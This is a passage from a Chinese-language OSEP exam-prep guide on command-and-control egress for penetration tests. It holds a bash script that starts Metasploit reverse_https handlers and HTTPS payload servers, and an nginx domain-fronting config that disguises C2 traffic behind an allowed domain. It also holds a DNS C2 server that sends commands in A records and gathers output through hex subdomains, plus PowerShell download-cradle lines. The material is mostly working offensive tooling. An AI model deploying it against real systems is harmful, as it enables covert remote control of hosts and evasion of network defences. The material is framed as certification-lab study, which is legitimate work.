#       --tool sslh 为透传模式（不解 TLS，把流量原样给本地 msf reverse_https handler）；
#       --mode msf 需要 msfconsole；--mode serve 需要 python3
# 使用：
#   bash m09-https-listener.sh --mode cert --domain DOMAIN                # 只生成自签证书并打印指纹
#   bash m09-https-listener.sh --mode ssl-test --port 8443 --to 4444      # TLS 8443 → 明文转发到本地 4444 handler
#   bash m09-https-listener.sh --mode serve  --port 443                   # HTTPS 投递（记录 UA，日志见 --outdir）
#   bash m09-https-listener.sh --mode msf   --port 443 --lhost LHOST      # 生成并运行 msf reverse_https handler
#   bash m09-https-listener.sh -h                                         # 完整帮助
# 占位符：LHOST=--lhost（证书 CN 与 msf 监听地址）、LPORT=--port（TLS 监听端口）与 --to（本地 handler 端口）、
#         DOMAIN=--domain（证书 CN/SAN，域前置时填前端域名）、TARGET=--probe（可选 TLS 握手探测目标）、
#         PAYLOAD=--payload（msf payload 名）
# 测试状态：已做 bash -n 语法校验；未在目标环境实测（本机无 socat/stunnel/msf，需实验环境验证）
set -uo pipefail

MODE="cert"
PORT="443"
TO=""
LHOST=""
DOMAIN=""
CERT="$HOME/osep/tools/cert.pem"
KEY="$HOME/osep/tools/key.pem"
PAYLOAD="windows/x64/meterpreter/reverse_https"
OUTDIR="$HOME/osep/logs"
SRVDIR="$HOME/osep/payloads"
TOOL="auto"
PROBE=""

usage() {
  cat <<'EOF'
m09-https-listener.sh —— 攻击机侧 HTTPS 监听 / TLS 转发 / HTTPS 投递（场景 30/31/33）

用法：
  bash m09-https-listener.sh --mode <cert|ssl-test|serve|msf> [选项]

模式：
  cert       只生成自签证书（openssl）并打印 SHA256 指纹
  ssl-test   起 TLS 监听，把 TLS 解密后的明文转发到本地 handler（--to）
  serve      起 HTTPS 文件投递服务（记录 User-Agent，用于排查应用层过滤）
  msf        生成 msfconsole resource 脚本并启动 reverse_https handler

选项：
  --mode MODE      运行模式（默认 cert）
  --port LPORT     TLS 监听端口（默认 443）
  --to LPORT       本地明文 handler 端口（ssl-test 必填，如 4444）
  --lhost LHOST    本机对外 IP（msf 的 LHOST / 证书 CN 备选）
  --domain DOMAIN  证书 CN 与 SAN（域前置时填前端域名 DOMAIN）
  --cert FILE      证书路径（默认 ~/osep/tools/cert.pem）
  --key FILE       私钥路径（默认 ~/osep/tools/key.pem）
  --payload NAME   msf payload（默认 windows/x64/meterpreter/reverse_https）
  --outdir DIR     日志/资源文件目录（默认 ~/osep/logs）
  --dir DIR        serve 模式投递目录（默认 ~/osep/payloads）
  --tool NAME      强制转发工具：socat|stunnel|sslh|python3（默认 auto）
  --probe TARGET   额外做一次对 TARGET:443 的 TLS 握手信息输出
  -h, --help       显示本帮助

示例：
  bash m09-https-listener.sh --mode cert --domain DOMAIN
  bash m09-https-listener.sh --mode ssl-test --port 443 --to 4444
  bash m09-https-listener.sh --mode serve --port 8443 --dir ~/osep/payloads
  bash m09-https-listener.sh --mode msf --port 443 --lhost LHOST
EOF
}

info() { printf '[*] %s\n' "$*"; }
ok()   { printf '[+] %s\n' "$*"; }
err()  { printf '[-] %s\n' "$*" >&2; }
die()  { err "$*"; exit 2; }

have() { command -v "$1" >/dev/null 2>&1; }

while [[ $# -gt 0 ]]; do
  case "$1" in
    --mode)    MODE="${2:-}"; shift 2 ;;
    --port)    PORT="${2:-}"; shift 2 ;;
    --to)      TO="${2:-}"; shift 2 ;;
    --lhost)   LHOST="${2:-}"; shift 2 ;;
    --domain)  DOMAIN="${2:-}"; shift 2 ;;
    --cert)    CERT="${2:-}"; shift 2 ;;
    --key)     KEY="${2:-}"; shift 2 ;;
    --payload) PAYLOAD="${2:-}"; shift 2 ;;
    --outdir)  OUTDIR="${2:-}"; shift 2 ;;
    --dir)     SRVDIR="${2:-}"; shift 2 ;;
    --tool)    TOOL="${2:-}"; shift 2 ;;
    --probe)   PROBE="${2:-}"; shift 2 ;;
    -h|--help) usage; exit 0 ;;
    *)         err "未知参数: $1"; usage; exit 2 ;;
  esac
done

[[ "$MODE" == "cert" || "$MODE" == "ssl-test" || "$MODE" == "serve" || "$MODE" == "msf" ]] \
  || die "--mode 必须是 cert|ssl-test|serve|msf（当前: ${MODE}）"
[[ "$PORT" =~ ^[0-9]+$ ]] || die "--port 必须是数字（当前: ${PORT}）"
mkdir -p "$OUTDIR" || die "无法创建日志目录 $OUTDIR"

# ---------------- 证书 ----------------
gen_cert() {
  have openssl || die "缺少 openssl（Kali 自带；macOS 可用 Homebrew 安装）"
  local cn="${DOMAIN:-${LHOST:-LHOST}}"
  mkdir -p "$(dirname "$CERT")" || die "无法创建证书目录 $(dirname "$CERT")"
  info "生成自签证书 CN=$cn -> $CERT"
  if ! openssl req -newkey rsa:2048 -nodes -keyout "$KEY" -x509 -days 365 -out "$CERT" \
        -subj "/CN=$cn" -addext "subjectAltName=DNS:$cn" 2>/dev/null; then
    # 老版本 openssl 不支持 -addext：退回不带 SAN 的写法
    openssl req -newkey rsa:2048 -nodes -keyout "$KEY" -x509 -days 365 -out "$CERT" \
      -subj "/CN=$cn" || die "openssl 生成证书失败"
  fi
  ok "证书: $CERT"
  ok "私钥: $KEY"
  echo "--- 指纹（记进考试笔记；目标侧信任或排错时用）---"
  openssl x509 -in "$CERT" -noout -fingerprint -sha256
  openssl x509 -in "$CERT" -noout -subject -dates
}

ensure_cert() {
  if [[ -f "$CERT" && -f "$KEY" ]]; then
    ok "使用已有证书: $CERT"
    return 0
  fi
  info "证书不存在，先生成"
  gen_cert
}

# ---------------- TLS 终止转发（socat / stunnel / python3） ----------------
run_socat() {
  have socat || return 1
  info "工具: socat  OPENSSL-LISTEN:$PORT -> 127.0.0.1:${TO}"
  exec socat -v -lf "$OUTDIR/tls-$PORT.log" \
    "OPENSSL-LISTEN:$PORT,cert=$CERT,key=$KEY,verify=0,fork,reuseaddr" \
    "TCP:127.0.0.1:${TO}"
}

run_stunnel() {
  have stunnel || have stunnel4 || return 1
  local bin="stunnel"; have stunnel || bin="stunnel4"
  info "工具: $bin  监听 $PORT -> 127.0.0.1:${TO}"
  exec "$bin" -fd 0 <<EOF
foreground = yes
pid =
output = $OUTDIR/tls-$PORT.log
[c2]
cert = $CERT
key = $KEY
accept = 0.0.0.0:$PORT
connect = 127.0.0.1:$TO
EOF
}

run_python() {
  have python3 || return 1
  info "工具: python3（内置 ssl 转发，零安装）  TLS:$PORT -> 127.0.0.1:${TO}"
  info "握手与异常日志: $OUTDIR/tls-$PORT.log"
  CERT="$CERT" KEY="$KEY" LPORT="$PORT" TOPORT="${TO}" LOGFILE="$OUTDIR/tls-$PORT.log" \
  python3 - <<'PY' 2>&1 | tee -a "$OUTDIR/tls-$PORT.log"
import datetime, os, socket, ssl, sys, threading

cert    = os.environ["CERT"]
key     = os.environ["KEY"]
lport   = int(os.environ["LPORT"])
toport  = int(os.environ["TOPORT"])

ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ctx.load_cert_chain(cert, key)

srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(("0.0.0.0", lport))
srv.listen(32)
print("[*] %s TLS listen 0.0.0.0:%d -> 127.0.0.1:%d" %
      (datetime.datetime.now(), lport, toport), flush=True)

def pipe(a, b):
    try:
        while True:
            data = a.recv(4096)
            if not data:
                break
            b.sendall(data)
    except OSError:
        pass
    finally:
        for s in (a, b):
            try:
                s.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass
            try:
                s.close()
            except OSError:
                pass

def handle(conn, addr):
    try:
        tls = ctx.wrap_socket(conn, server_side=True)
    except (ssl.SSLError, OSError) as e:
        print("[-] %s TLS 握手失败: %s" % (addr[0], e), flush=True)
        conn.close()
        return
    print("[+] %s 完成握手 %s %s" % (addr[0], tls.version(), tls.cipher()[0]), flush=True)
    try:
        up = socket.create_connection(("127.0.0.1", toport), 5)
    except OSError as e:
        print("[-] 本地 handler 127.0.0.1:%d 不可连: %s（先起 handler 再跑本脚本）" %
              (toport, e), flush=True)
        tls.close()
        return
    threading.Thread(target=pipe, args=(tls, up), daemon=True).start()
    pipe(up, tls)

while True:
    conn, addr = srv.accept()
    threading.Thread(target=handle, args=(conn, addr), daemon=True).start()
PY
}

run_sslh() {
  have sslh || die "未找到 sslh（Kali: apt install sslh）；透传模式不解 TLS，直接把流量给本地 handler"
  info "工具: sslh（透传，TLS 由后端 handler 自己解）  $PORT -> 127.0.0.1:${TO}"
  [[ -n "${TO}" ]] || die "sslh 模式需要 --to 指定后端端口"
  exec sslh --listen "0.0.0.0:$PORT" --tls "127.0.0.1:${TO}" --foreground
}

do_ssl_test() {
  [[ -n "${TO}" ]] || die "ssl-test 需要 --to <本地 handler 端口>，例：--port 443 --to 4444"
  ensure_cert
  info "流程提醒：先起本地明文 handler（如 msf reverse_http 或 ncat -lvnp ${TO}），再由本脚本做 TLS 终止"
  case "$TOOL" in
    socat)   run_socat ;;
    stunnel) run_stunnel || die "stunnel 启动失败" ;;
    sslh)    run_sslh ;;
    python3) run_python ;;
    auto)
      run_socat || run_stunnel || run_python
      ;;
    *) die "--tool 只能是 socat|stunnel|sslh|python3" ;;
  esac
}

# ---------------- HTTPS 投递 ----------------
do_serve() {
  have python3 || die "serve 模式需要 python3"
  ensure_cert
  [[ -d "$SRVDIR" ]] || info "投递目录 $SRVDIR 不存在，先把 PAYLOAD 放进去（或改 --dir）"
  mkdir -p "$SRVDIR"
  info "HTTPS 投递 :$PORT  目录=$SRVDIR  日志=$OUTDIR/https-$PORT.log"
  SRVDIR="$SRVDIR" CERT="$CERT" KEY="$KEY" LPORT="$PORT" \
  python3 - <<'PY' 2>&1 | tee -a "$OUTDIR/https-$PORT.log"
import datetime, http.server, os, socketserver, ssl

srvdir = os.environ["SRVDIR"]
lport  = int(os.environ["LPORT"])
os.chdir(srvdir)

class H(http.server.SimpleHTTPRequestHandler):
    def log_message(self, fmt, *args):
        ua = self.headers.get("User-Agent", "-")
        host = self.headers.get("Host", "-")
        print("%s %s host=%s ua=%s %s" %
              (datetime.datetime.now(), self.address_string(), host, ua, fmt % args))

class S(socketserver.ThreadingTCPServer):
    allow_reuse_address = True
    daemon_threads = True

httpd = S(("0.0.0.0", lport), H)
ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ctx.load_cert_chain(os.environ["CERT"], os.environ["KEY"])
httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)
print("[*] https://0.0.0.0:%d serving %s" % (lport, srvdir), flush=True)
httpd.serve_forever()
PY
}

# ---------------- msf handler ----------------
do_msf() {
  have msfconsole || die "未找到 msfconsole（Kali 自带）"
  [[ -n "$LHOST" ]] || die "msf 模式需要 --lhost LHOST"
  local rc="$OUTDIR/https-handler-$PORT.rc"
  cat > "$rc" <<EOF
use exploit/multi/handler
set PAYLOAD $PAYLOAD
set LHOST $LHOST
set LPORT $PORT
set ExitOnSession false
set EnableStageEncoding true
run -j
EOF
  ok "resource 脚本: $rc"
  info "提示：若前面用 socat/stunnel 做 TLS 终止，则 msf 应改用 reverse_http（明文）监听 127.0.0.1:${TO}，"
  info "      本脚本 msf 模式用于 payload 自己带 TLS（reverse_https）直接连 443 的情形。"
  exec msfconsole -q -r "$rc"
}

# ---------------- 可选：对目标的 TLS 握手探测 ----------------
do_probe() {
  have openssl || return 0
  info "探测 $PROBE:443 的 TLS（用于对照'目标访问公网 HTTPS 正常 / 访问我们失败'）"
  echo | timeout 8 openssl s_client -connect "$PROBE:443" -servername "$PROBE" 2>&1 \
    | grep -E "CONNECTED|subject=|issuer=|Protocol|Cipher|Verify return code|alert" | head -20
}

case "$MODE" in
  cert)     gen_cert ;;
  ssl-test) do_ssl_test ;;
  serve)    do_serve ;;
  msf)      do_msf ;;
esac

[[ -n "$PROBE" ]] && do_probe
exit 0
````

**验证**：路径卡片上每个阶段都有"该路径实测通过"标记（投递日志 GET / 握手日志 / 会话）；断开后重连（ExitOnSession false）仍能回来。

**失败分支与备选**：
- 目标请求了第二阶段但进程被终止 → 静态/行为检测，按 M05 场景 18–19 处理，别继续换地址。
- 请求根本没到 → 对照 28/29 检查代理与身份上下文。
- staged 反复失败 → 换 stageless 单条路径；仍失败再检查监听 payload 位数（x86/x64）。

**考试注意 / OPSEC**：考试丢分重灾区是"第一阶段通了就以为成功"，必须看到第二阶段会话才进入下一步；每阶段记录路径卡片，避免靠记忆猜 URL/端口。

---

## 场景 31：目标只允许 HTTPS，但 HTTPS 检查影响通信

**场景回顾**：目标能访问普通 HTTPS 网站，我方 payload 在 TLS 握手或请求阶段失败——存在代理检查、证书信任或应用层（UA/路径）过滤。

**前提与假设**：出口只放行 443/HTTPS；可能存在 TLS 中间盒（MITM 重签）或只放行到白名单域名的检查；我方监听侧能提供 HTTPS 服务并查看握手/请求日志。

**准备（攻击机侧）**：生成证书并起 HTTPS 投递/监听，两种证书策略都备好：
- 自签：`openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem -subj "/CN=LHOST"`（目标不校验根时可过；**记下指纹**便于排错）。
- 可信证书：公网域名 + Let's Encrypt（出口无 MITM 时最稳）；实验网内若有校内 CA 也可导入信任。

**执行步骤**：
1. 分点定位：目标能否 TCP 连到你的 443（`Test-NetConnection LHOST -Port 443`）→ 能连但 TLS 失败 → 证书/中间盒问题；连都连不上 → 出口按 IP/SNI 过滤。
2. 握手失败排证书：看 HTTPS 监听日志记录握手是否发生、客户端报错（证书不受信 / 主机名不匹配）。自签证书在 PowerShell 里默认拒绝 → 客户端加 `-SkipCertificateCheck`（PS 7）或 `ServerCertificateValidationCallback`（PS 5，脚本内处理），或把自签证书加入目标受信根。
3. 中间盒 MITM 重签：目标信任的是中间盒的根 → 自签必然失败 → 换"中间盒放行的域名 + 可信证书"（见失败分支与域前置 33）。
4. 应用层过滤排 UA/路径：请求头伪装常见浏览器 UA（m09-https-listener.sh 记录 UA 供核对）；路径/查询串无特征。
5. 若目标要求经代理访问 HTTPS → 组合场景 28：代理参数 + HTTPS 客户端。

**用到的脚本**：
| 脚本 | 用途 | 关键参数 |
|---|---|---|
| `m09-https-listener.sh` | HTTPS 监听：msf reverse_https handler 或 TLS 测试模式，记录 UA/握手 | `--mode msf\|ssl-test --cert cert.pem --key key.pem` |
| `m09-domain-fronting-nginx.conf` | 需要按域名转发/SNI 处理时的前端模板 | 见场景 33 |
| `m09-proxy-aware-downloader.ps1` | HTTPS 下载 + 证书校验开关 | `-Url https://LHOST/PAYLOAD -SkipCertCheck` |

#### `m09-domain-fronting-nginx.conf`

````nginx
# 用途：域前置（Domain Fronting）前端配置——TLS 层用目标放行的前端域名 DOMAIN（SNI + 证书），
#       HTTP 层的 Host 头写真实后端标识 URL，nginx 按 Host 把请求转发到后端 C2（LHOST:LPORT）。
#       出口检查看到的是 SNI/证书/目的地址 = DOMAIN（放行），后端只由 nginx 内部按 Host 决定。
# 场景：33（目标只放行特定前端地址，直连后端不通；实验基础设施支持前端/后端分离）、31（HTTPS 检查旁路）
# 依赖：nginx（stream 段按 SNI 分流需要 --with-stream_ssl_preread 模块，无该模块时只用 http 段按 Host 分流即可）；
#       DOMAIN 的 TLS 证书（自签可用，前提是目标侧不校验或我们已忽略证书校验）；后端 C2/投递监听（m09-https-listener.sh）
# 使用：
#   1) 替换全部占位符后放到 /etc/nginx/nginx.conf（或把 http{} 内容 include 进现有配置）
#   2) nginx -t && nginx -s reload
#   3) 目标侧验证：curl -k --resolve DOMAIN:443:LHOST -H "Host: URL" https://DOMAIN/PAYLOAD -o PAYLOAD
# 占位符：DOMAIN=前端域名（目标允许访问；SNI 与证书用它）、URL=后端标识（Host 头里放它，nginx 据此路由）、
#         LHOST=后端 C2 监听地址、LPORT=后端 C2 端口、PAYLOAD=投递的文件名
# 测试状态：未在本机 nginx 实测；配置结构按 nginx 语法人工核对（map / upstream / if+proxy_pass 用法）

worker_processes auto;

events {
    worker_connections 1024;
}

http {
    default_type application/octet-stream;
    sendfile on;
    keepalive_timeout 15;

    # ---- 后端标识判定：Host 头等于 URL 时走后端，其它（含 DOMAIN 本身）返回掩护页面 ----
    # nginx 里 "1" 为真 / "0" 为假，因此这里用 0/1 而不是 yes/no
    map $http_host $is_backend {
        default        0;
        "URL"          1;
    }

    upstream c2_backend {
        server LHOST:LPORT;
        keepalive 8;
    }

    # ---- 排查用日志：同时记录 SNI、Host、UA（场景 31 定位"握手成功但请求被拦"）----
    log_format fronting '$remote_addr [$time_local] sni=$ssl_server_name '
                        'host=$http_host ua="$http_user_agent" '
                        'proto=$ssl_protocol req="$request" status=$status backend=$is_backend';
    access_log /var/log/nginx/fronting-access.log fronting;
    error_log  /var/log/nginx/fronting-error.log warn;

    # ---- 前端：443 终结 TLS，证书属于 DOMAIN ----
    server {
        listen 443 ssl default_server;
        server_name DOMAIN;

        ssl_certificate     /etc/nginx/certs/DOMAIN.crt;
        ssl_certificate_key /etc/nginx/certs/DOMAIN.key;
        ssl_protocols       TLSv1.2 TLSv1.3;
        ssl_prefer_server_ciphers off;
        ssl_session_cache   shared:fronting:1m;

        # SNI 说明（重点）：
        #   - 客户端必须让 SNI = DOMAIN（curl 用 --resolve DOMAIN:443:LHOST 指定，PowerShell 直接用 https://DOMAIN/）
        #   - 如果客户端把 SNI 也写成 URL，出口处就会看到未放行的域名，域前置失效
        #   - nginx 的 $ssl_server_name 只用于日志记录，本配置不做 SNI 校验（否则会拒绝 Host=URL 的请求）

        # 大请求（staged payload / 上传）不要被缓冲截断
        client_max_body_size 64m;
        proxy_request_buffering off;
        proxy_buffering off;

        # 掩护响应与后端响应都以纯文本返回，避免被当成异常站点
        default_type text/plain;

        # 显式路径入口：即使 Host 判断失效，也可以用固定路径做后端转发（便于考前快速验证）
        location = /PAYLOAD {
            proxy_pass http://c2_backend;
            proxy_http_version 1.1;
            proxy_set_header Host              $http_host;
            proxy_set_header X-Forwarded-For   $remote_addr;
            proxy_set_header X-Forwarded-Proto https;
            proxy_set_header Connection        "";
        }

        location / {
            # Host=URL → 转发到后端 C2；保留原始 Host，后端才能按 Host 识别自己的 vhost
            if ($is_backend) {
                proxy_pass http://c2_backend;
                proxy_http_version 1.1;
                proxy_set_header Host              $http_host;
                proxy_set_header X-Forwarded-For   $remote_addr;
                proxy_set_header Connection        "";
                break;
            }

            # 其它 Host（含正常访问 DOMAIN）→ 返回无害页面，作为掩护
            return 200 "ok\n";
        }
    }

    # ---- 明文 80：只用于本地/nginx 自身连通性测试，不做转发 ----
    server {
        listen 80 default_server;
        server_name DOMAIN;
        location / { return 200 "ok\n"; }
    }
}

# ============================================================
# 可选：stream 段按 SNI 分流（需要 nginx 编译时带 --with-stream_ssl_preread）
# 用途：同一端口上，SNI=DOMAIN 的流量转后端 C2，其它 SNI 转本地伪装站点。
# 与上面的 http 段二选一使用；同时启用时要把 443 端口让给 stream（http 段改成 listen 8443 之类）。
# ============================================================
# stream {
#     log_format sni '$remote_addr sni=$ssl_preread_server_name -> $upstream_addr';
#     access_log /var/log/nginx/fronting-sni.log sni;
#
#     map $ssl_preread_server_name $sni_upstream {
#         default        127.0.0.1:8080;    # 未匹配：本地伪装站点
#         "DOMAIN"       LHOST:LPORT;       # SNI=DOMAIN：后端 C2（TLS 由后端自己解）
#     }
#
#     server {
#         listen 443;
#         ssl_preread on;                   # 只读 SNI，不解 TLS
#         proxy_pass $sni_upstream;
#     }
# }

# ============================================================
# 验证步骤（考前先做一次无害 GET）
#   1) 目标侧确认只放行 DOMAIN：
#        curl -sI https://DOMAIN/            → 期望 200 "ok"
#   2) 带后端 Host 取载荷（SNI 仍是 DOMAIN）：
#        curl -k --resolve DOMAIN:443:LHOST -H "Host: URL" https://DOMAIN/PAYLOAD -o PAYLOAD
#   3) 后端日志（m09-https-listener.sh --mode serve 的日志）应出现该请求，且 Host=URL
#   4) PowerShell 形态（场景 33 文档里的写法）：
#        $c = New-Object Net.WebClient; $c.Headers.Add("Host","URL");
#        $c.DownloadString("https://DOMAIN/PAYLOAD")
#
# 不成立时的排查顺序
#   - 返回 421/403/502：前端（或真实 CDN）校验了 SNI 与 Host 一致性 → 该基础设施不支持域前置，改场景 28（代理）或 32（DNS）
#   - 证书报错：客户端必须忽略证书校验（curl -k / PowerShell 的 ServerCertificateValidationCallback），
#     否则要持有 DOMAIN 的可信证书
#   - 后端没日志：检查 upstream 的 LHOST:LPORT 是否真在监听（ss -ltnp），以及 $is_backend 是否被 map 命中
# ============================================================
````

**验证**：握手日志显示目标完成 TLS（或 msf 出现会话）；对比"目标访问公网 HTTPS 正常 vs 访问我们失败"的差异点已消除。

**失败分支与备选**：
- 中间盒重签且校验链 → 找中间盒放行的域名做域前置（33），或确认实验环境是否有豁免。
- 出口按 SNI/目的 IP 白名单 → 域前置（33）；连白名单外域名都不给解析 → DNS 通道（32）。
- 客户端不校验但握手仍失败 → 确认 TLS 版本/密码套件（WinHTTP 默认 OK，老系统可能要降级配置）。

**考试注意 / OPSEC**：自签证书指纹明显，排错先确认监听日志里是你自己的指纹；UA 与投递/下载阶段保持一致，别一半默认一半伪装；HTTPS 不加密代理头的 Host/SNI，别把机密放 URL。

---

## 场景 32：普通 HTTP(S) 通信不通，但课程实验允许 DNS 通道

**场景回顾**：目标能执行代码，直接连接与常规代理均不可用，但目标仍可用 DNS 出网。

**前提与假设**：实验/考试环境明确允许 DNS 隧道（教材 §14.7）；你有一个域（或实验网内允许的域名）且能把 NS 记录指向攻击机，或目标能直接 UDP 53 到达攻击机；目标机上能执行我们的客户端（Python 3 需解释器；无解释器时换 dnscat2/iodine 或 PowerShell 移植版，脚本注释已说明）。

**准备（攻击机侧）**：本模块自带最小 DNS C2 对（`m09-dns-c2-server.py` + `m09-dns-c2-client.py`），用于"确认 DNS 通道可用 + 传命令取回输出"。完整隧道工具 dnscat2/iodine 需要时再上。本实验直接让目标连攻击机 UDP 53：

```bash
# 攻击机：起权威式 DNS C2 服务器（占 53 需要 root）
sudo python3 m09-dns-c2-server.py --listen 0.0.0.0 --port 53 \
    --domain c2.example --outdir ~/osep/logs
# 服务器控制台输入:  SESSIONID  whoami /priv     # 给指定会话发命令
```

**执行步骤**：
1. 目标侧确认 DNS 可达：`nslookup c2.example LHOST`（直连）或正常 `nslookup` 递归（取决于环境）。
2. 目标侧起客户端（无 Python 时先传解释器或换 dnscat2 二进制）：
```bash
python3 m09-dns-c2-client.py --server LHOST --port 53 --domain c2.example \
    --session a1b2c3d4 --interval 2
```
3. 客户端心跳携带会话 ID → 服务器控制台给该会话发命令 → 客户端解码并本地执行 → 输出分块经 `o<hex>` 标签回传（单条命令输出控制在 1–2 KB 内，更大分多次）。
4. 服务器端确认收到输出（终端打印 / outdir 落盘）。DNS 查询在出口处就是普通 A 查询，路径上不经过代理。
5. 通道稳定后把第二阶段也改由 DNS 投递（不落地、少请求），或仅用 DNS 做应急回传。

**用到的脚本**：
| 脚本 | 用途 | 关键参数 |
|---|---|---|
| `m09-dns-c2-server.py` | DNS C2 服务端（UDP 53，A 记录应答） | `--listen 0.0.0.0 --port 53 --domain c2.example` |
| `m09-dns-c2-client.py` | DNS C2 客户端（心跳/收命令/回传输出） | `--server LHOST --session a1b2c3d4 --interval 2` |

#### `m09-dns-c2-server.py`

````python
#!/usr/bin/env python3
"""用途：极简 DNS C2 服务端——把命令编码进 DNS A 记录响应回给目标，同时接收目标经子域 hex 回传的输出。
        配合 m09-dns-c2-client.py 使用，用于确认 DNS 通道可用并做少量命令/输出交互（教材 §14.7 思路的最小实现）。

场景：32（HTTP(S) 不通但允许 DNS 通道时的应急回传）。完整大流量隧道请另用 dnscat2/iodine，本对只做"通与不通 + 传命令取回输出"。

依赖：Python 3.7+ 标准库（socket/struct）。需 root 监听 53，或目标可直连本机 UDP 端口。
      域名要求：实验室允许的域把 NS 指向本机，或客户端直连本机 IP（本实现默认直连模式，最简单）。

使用：
    sudo python3 m09-dns-c2-server.py --port 53 --domain c2.example --outdir ~/osep/logs
    服务端控制台（交互模式）：
        list                        # 列出已见过心跳的会话
        send <SESSION> whoami /priv # 给该会话下发一条命令（长度 <= 40 字节）
        quit
    验证（另一终端）：
        dig @LHOST c2.example        # 若无 dig，tcpdump -i any udp port 53

占位符：LHOST=攻击机 IP；SESSION=客户端自选的 8 位 hex 会话 id；c2.example=你控制的域后缀

测试状态：已在 Kali/macOS 用 Python3 语法编译通过，并与客户端在本机 127.0.0.1:5353 做过直连回路测试
          （服务器收心跳、下发命令、接收回传输出）。DNS 递归/NS 部署形态未在真实域验证，考试前按场景 32 步骤先做无害验证。
"""
import argparse
import binascii
import os
import socket
import struct
import sys
import threading

MAX_CMD = 40          # 每次查询最多回传的命令字节数（4 字节/A 记录 * 10 条 A 记录）
CMD_END = b"\n"       # 命令结束标记
pools = {}            # session -> {"in": bytes 待下发, "out": bytes 待接收日志}
sessions = {}         # session -> last-seen ts（简单计数）
_lock = threading.Lock()

def parse_qname(data, off):
    """解析 DNS 名字（含压缩指针），返回 (name_str, 结束偏移)。"""
    labels, end = [], None
    while True:
        ln = data[off]
        if ln == 0:
            end = off + 1
            break
        if ln & 0xC0 == 0xC0:                    # 压缩指针：0xC0 0xXX，指向包内偏移
            ptr = struct.unpack(">H", data[off:off + 2])[0] & 0x3FFF
            if end is None:
                end = off + 2
            off = ptr
            continue
        labels.append(data[off + 1:off + 1 + ln].decode("ascii", "ignore"))
        off += 1 + ln
    return ".".join(labels), end

def parse_query(data):
    """解析查询包头 + 第一个问题，返回 (tid, qname, 问题区结束偏移)。"""
    if len(data) < 12:
        return None
    tid = struct.unpack(">H", data[:2])[0]
    qd = struct.unpack(">H", data[4:6])[0]
    if qd < 1:
        return None
    qname, off = parse_qname(data, 12)
    return tid, qname.lower(), off + 4          # 跳过 qtype+qclass

def encode_name(name):
    """把 'a.b.c' 形式的域名字符串编码为 DNS 线格式（每段 <=63 字符）。"""
    out = b""
    for label in name.split("."):
        b = label.encode("ascii")
        if len(b) > 63:
            raise ValueError("label too long: " + label)
        out += bytes([len(b)]) + b
    return out + b"\x00"

def build_reply(tid, qname, rdatas=None):
    """构造标准应答：echo 问题 + N 条 A 记录（rdatas 为 4 字节 rdata 列表）。"""
    rdatas = rdatas or []
    flags = 0x8180                              # QR=1 RD=1 RA=1
    hdr = struct.pack(">HHHHH", tid, flags, 1, len(rdatas), 0, 0)
    q = encode_name(qname) + struct.pack(">HH", 1, 1)      # qtype=A qclass=IN
    ans = b""
    for r in rdatas:
        ans += b"\xc0\x0c" + struct.pack(">HHIH", 1, 1, 1, 4) + r   # 名字指针+A+IN+ttl1+rdlen4+rdata
    return hdr + q + ans

def chunk_cmd(cmd, max_cmd=MAX_CMD):
    """把命令字节切成 <=max_cmd 的 4 的倍数长度的块，返回 [(块, 是否末块)]。"""
    chunks = []
    for i in range(0, len(cmd), max_cmd):
        piece = cmd[i:i + max_cmd]
        last = i + max_cmd >= len(cmd)
        chunks.append((piece, last))
    return chunks

def pack_rdatas(chunk):
    """把字节块切成 4 字节一组（末组补零），作为 A 记录 rdata。"""
    out = []
    for i in range(0, len(chunk), 4):
        out.append(chunk[i:i + 4].ljust(4, b"\x00"))
    return out

def handle(data, domain, outdir):
    parsed = parse_query(data)
    if not parsed:
        return b""
    tid, qname, _ = parsed
    if not qname.endswith("." + domain) and qname != domain:
        return b""                              # 非本域查询直接丢弃
    head = qname[: -(len(domain) + 1)] if qname != domain else ""
    parts = head.split(".")
    if len(parts) < 2:
        return b""
    kind, session = parts[0], parts[1]
    if not all(c in "0123456789abcdef" for c in session) or len(session) > 16:
        return b""

    with _lock:
        pools.setdefault(session, {"in": b"", "out": b""})
        if kind == "h":                         # 心跳：顺带接收命令（编码在应答 A 记录里）
            sessions[session] = sessions.get(session, 0) + 1
            buf = pools[session]["in"]
            take = buf[:MAX_CMD]
            if take:
                pools[session]["in"] = buf[len(take):]
                print(f"[>] session={session} 下发 {len(take)} 字节", flush=True)
                return build_reply(tid, qname, pack_rdatas(take))
            return build_reply(tid, qname)      # 无待发命令：空应答
        if kind == "o":                         # 回传输出：o.<session>.<hexdata>.<domain>
            hexdata = "".join(parts[2:])
            try:
                raw = binascii.unhexlify(hexdata)
            except Exception:
                return b""
            pools[session]["out"] += raw
            fname = os.path.join(outdir, f"{session}.out")
            with open(fname, "ab") as f:
                f.write(raw + b"\n")
            print(f"[<] session={session} 收到 {len(raw)} 字节 -> {fname}", flush=True)
            return build_reply(tid, qname)
    return b""

def console(domain):
    print("[*] 控制台: list | send <SESSION> <cmd(<=40B)> | quit", flush=True)
    for line in sys.stdin:
        line = line.strip()
        if line == "quit":
            os._exit(0)
        if line == "list":
            print(f"[*] 活跃会话: {sorted(sessions)}", flush=True)
        elif line.startswith("send "):
            rest = line[5:].split(" ", 1)
            if len(rest) != 2:
                print("[-] 用法: send <SESSION> <command>", flush=True)
                continue
            sid, cmd = rest[0], rest[1].encode()
            if len(cmd) > 512:
                print("[-] 命令超长(>512B)，拆短重发（输出请让客户端分块回传）", flush=True)
                continue
            with _lock:
                pools.setdefault(sid, {"in": b"", "out": b""})
                pools[sid]["in"] += cmd + CMD_END
            print(f"[>] 已入队给 {sid}: {cmd.decode(errors='replace')} (分 {-(len(cmd) // -MAX_CMD)} 次心跳下发)", flush=True)

def main():
    ap = argparse.ArgumentParser(description="极简 DNS C2 服务端（场景 32）")
    ap.add_argument("--listen", default="0.0.0.0")
    ap.add_argument("--port", type=int, default=53)
    ap.add_argument("--domain", required=True, help="我们控制的域后缀，如 c2.example")
    ap.add_argument("--outdir", default=".")
    args = ap.parse_args()
    os.makedirs(args.outdir, exist_ok=True)

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.bind((args.listen, args.port))
